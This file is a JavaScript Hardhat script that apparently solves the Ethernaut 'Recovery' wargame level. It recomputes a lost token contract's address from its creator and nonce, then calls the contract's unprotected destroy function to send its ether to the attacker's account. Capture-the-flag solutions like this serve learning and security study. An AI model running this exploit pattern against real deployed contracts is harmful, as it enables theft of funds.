const {BLOCK_EXPLORER_URL, RECOVERY_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Recovery level');

    if (!RECOVERY_INSTANCE_ADDRESS) {
        console.log('Recovery instance address not found');
        return;
    }

    console.log('Recovery instance address', RECOVERY_INSTANCE_ADDRESS);

    const [attacker] = await ethers.getSigners();
    // const factory = await ethers.getContractFactory("SimpleToken");
    // const contract = factory.attach(RECOVERY_INSTANCE_ADDRESS);
    //calculate the token contract adddress 
    const tokenAddr = predictContractAddress(RECOVERY_INSTANCE_ADDRESS, 0);
    console.log(`Recovered token address is ${tokenAddr}`);
    //get the contract at that address 
    const tokenContract = await ethers.getContractAt("SimpleToken", tokenAddr);

    //destroy it
    console.log(`destroying token to ${attacker.address}...`);
    const tx = await tokenContract.destroy(attacker.address);
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);
    await tx.wait(1);

    console.log('\x1b[32m%s\x1b[0m', 'Recovery level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

function predictContractAddress(creatorAddr, txCount) {
    return "0x" + (ethers.utils.solidityKeccak256(
        ["bytes1", "bytes1", "address", "bytes1"],
        ["0xd6", "0x94", creatorAddr, txCount + 1]
    )).substring(26);
}

module.exports = main;
